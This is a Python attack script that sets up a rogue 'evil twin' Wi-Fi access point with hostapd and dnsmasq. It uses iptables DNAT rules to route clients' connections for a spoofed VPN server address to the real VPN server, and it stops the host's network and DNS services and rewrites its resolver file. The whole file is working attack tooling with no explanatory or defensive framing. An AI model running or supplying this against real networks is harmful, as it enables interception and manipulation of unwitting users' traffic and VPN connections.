#!/usr/bin/env python3
import subprocess, json, sys, os, time, signal, re

class ServerIPAttack:
    def __init__(self, config="/tmp/evil.json"):
        with open(config) as f:
            self.c = json.load(f)
        self.procs = []
        self.ap_interface = "ap0"

    def sh(self, cmd, check=False):
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check)

    def detect_phy(self, iface):
        out = self.sh("iw dev")
        if not out or not out.stdout:
            print("  !!! Could not run 'iw dev'")
            sys.exit(1)

        lines = out.stdout.splitlines()
        current_phy = None
        found_phy = None

        for line in lines:
            m1 = re.search(r"(phy#\d+)", line)
            if m1:
                current_phy = m1.group(1)
            m2 = re.search(r"Interface[:\s]+(\S+)", line)
            if m2:
                name = m2.group(1)
                if name == iface:
                    found_phy = current_phy
                    break

        if not found_phy:
            print(f"  !!! Could not detect WiFi PHY for {iface}")
            sys.exit(1)

        return found_phy.replace("#", "")

    def stop_conflicts(self):
        for s in ["NetworkManager", "systemd-resolved", "dnsmasq", "bind9", "named"]:
            self.sh(f"systemctl stop {s}", check=False)
        self.sh("pkill -9 dnsmasq", check=False)
        self.sh("rfkill unblock all")

    def setup_iface(self):
        ap = self.ap_interface
        wifi = self.c["wifi"]
        phy = self.detect_phy(wifi)
        ip = self.c["ap_ip"]
        subnet = self.c["subnet"].split("/")[1]

        self.sh(f"iw dev {ap} del", check=False)
        self.sh(f"iw phy {phy} interface add {ap} type __ap")
        self.sh(f"ip link set {ap} up")
        self.sh(f"ip addr flush dev {ap}", check=False)
        self.sh(f"ip addr add {ip}/{subnet} dev {ap}")

    def routing(self):
        ap = self.ap_interface
        eth = self.c["eth"]
        spoofed = self.c["spoof_ip"]
        vpn_domain = self.c["vpn_domain"]

        # Resolve real VPN IP
        real_vpn = self.c.get("real_vpn_server_ip")
        if not real_vpn or real_vpn == "None":
            out = self.sh(f"dig +short @8.8.8.8 {vpn_domain}")
            real_vpn = [l for l in out.stdout.split("\n") if re.match(r'^\d+\.\d+\.\d+\.\d+$', l.strip())]
            if real_vpn:
                real_vpn = real_vpn[0].strip()
                self.c["real_vpn_server_ip"] = real_vpn
                with open("/tmp/evil.json", "w") as f:
                    json.dump(self.c, f, indent=2)
            else:
                print("!!! Failed to resolve real VPN IP")
                sys.exit(1)

        print(f"VPN: {vpn_domain} -> Spoofed: {spoofed} -> Real: {real_vpn}")

        # System config
        self.sh("sysctl -w net.ipv4.ip_forward=1")
        self.sh(f"sysctl -w net.ipv4.conf.all.rp_filter=0")
        self.sh(f"sysctl -w net.ipv4.conf.{ap}.rp_filter=0")
        self.sh(f"sysctl -w net.ipv4.conf.{eth}.rp_filter=0")
        self.sh(f"sysctl -w net.ipv4.conf.all.send_redirects=0")

        # Clear old rules
        self.sh("iptables -t nat -F PREROUTING")
        self.sh("iptables -t nat -F POSTROUTING")
        self.sh("iptables -P FORWARD ACCEPT")

        # DNAT: Redirect spoofed IP to real VPN
        for port in ["443", "1194", "8080"]:
            self.sh(f"iptables -t nat -A PREROUTING -i {ap} -d {spoofed} -p tcp --dport {port} -j DNAT --to-destination {real_vpn}:{port}")
        for port in ["1194", "443", "51820", "500", "4500"]:
            self.sh(f"iptables -t nat -A PREROUTING -i {ap} -d {spoofed} -p udp --dport {port} -j DNAT --to-destination {real_vpn}:{port}")

        # SNAT: Masquerade outbound
        self.sh(f"iptables -t nat -A POSTROUTING -o {eth} -j MASQUERADE")

    def start_hostapd(self):
        p = subprocess.Popen(["hostapd", "/tmp/hostapd-evil.conf"],
            stdout=open("/var/log/hostapd-evil.log", "w"), stderr=subprocess.STDOUT)
        self.procs.append(p)
        time.sleep(2)
        return p.poll() is None

    def start_dnsmasq(self):
        with open("/etc/resolv.conf", "w") as f:
            f.write("nameserver 8.8.8.8\nnameserver 1.1.1.1\n")
        p = subprocess.Popen(["dnsmasq", "--no-daemon", "--log-queries",
             "--conf-file=/tmp/dnsmasq-evil.conf"],
            stdout=open("/var/log/dnsmasq-evil.log", "w"), stderr=subprocess.STDOUT)
        self.procs.append(p)
        time.sleep(2)
        return p.poll() is None

    def start(self):
        self.stop_conflicts()
        self.setup_iface()
        self.routing()

        if not self.start_hostapd():
            print("[!] hostapd failed"); return
        if not self.start_dnsmasq():
            print("[!] dnsmasq failed"); return

        print(f"[*] SSID: {self.c['ssid']}")
        print(f"[*] AP: {self.ap_interface} ({self.c['ap_ip']})")
        print("[*] Ready - Press Ctrl+C to stop")
        
        signal.signal(signal.SIGINT, lambda s,f: sys.exit(0))
        while True:
            time.sleep(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Run as root"); sys.exit(1)
    ServerIPAttack().start()